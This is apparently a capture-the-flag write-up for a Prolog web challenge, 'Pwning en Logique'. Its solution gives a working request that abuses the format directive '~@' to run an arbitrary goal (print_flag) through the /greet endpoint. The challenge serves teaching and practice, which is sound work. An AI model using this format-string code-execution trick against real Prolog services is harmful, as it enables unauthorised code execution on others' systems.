# Pwning en Logique
**Category:** Web
**Difficulty:** Medium

## Description

`solved_pwnlog(X) :- '1337haxor'(X).`

## Distribution

## Solution
Log in as either user (guest or AzureDiamond) and make a request to `/greet?format=~@~i&greeting=print_flag`. (`~@` in format interprets the argument as a goal to execute and `~i` just ignores the argument)